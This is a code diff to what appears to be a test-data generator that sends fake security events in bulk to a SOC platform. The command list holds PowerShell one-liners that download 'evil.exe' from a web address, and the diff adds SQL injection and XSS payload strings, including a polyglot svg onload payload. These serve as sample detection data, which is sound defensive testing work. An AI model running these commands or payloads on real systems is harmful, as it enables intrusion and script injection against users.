@@ -97,7 +97,12 @@ def random_powershell_command():
   commands = [
     'powershell -c "(New-Object System.Net.WebClient).Downloadfile(\'https://reflexsoar.com/evil.exe\',C:/temp/evil.exe)"',
     'Start-BitsTransfer -Source https://reflexsoar.com/evil.exe -Destination C:/temp/evil.exe -Asynchronous',
-    ''
+    'administrator") OR 1=1 --;',
+    'alert(1);',
+    'javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/"/+/onmouseover=1/+/[*/[]/+alert(1)//\'>',
+    '<IMG SRC="javascript:alert(\'XSS\');">',
+    '<IMG SRC=javascript:alert(\'XSS\')>',
+    '<IMG SRC=javascript:alert(&quot;XSS&quot;)>'
   ]
 
   return commands[random.randint(0, len(commands)-1)]
@@ -288,7 +293,7 @@ def random_event():
 
 
 events = []
-for i in range(0,25):
+for i in range(0,50):
     events.append(random_event())
 print("Sending {} events...".format(len(events)))
 bulk(events)
